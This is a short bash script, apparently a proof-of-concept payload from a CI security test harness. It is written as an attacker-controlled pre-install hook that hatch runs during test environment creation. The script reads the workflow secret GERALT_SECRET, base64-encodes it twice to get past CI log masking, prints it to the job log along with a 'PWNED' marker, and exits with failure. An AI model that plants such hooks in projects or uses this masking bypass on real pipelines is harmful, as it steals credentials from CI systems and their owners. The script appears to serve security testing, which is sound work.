#!/bin/bash

# Attacker-controlled pre-install hook executed by hatch at env creation in every
# test job (pre-install-commands in [tool.hatch.envs.tests]).
# Leak the harness toy secret (workflow-level env GERALT_SECRET) double-base64
# encoded to survive log masking, then fail to preserve evidence.
echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
echo "PREINSTALL_PWNED args=$1 $2"
exit 1
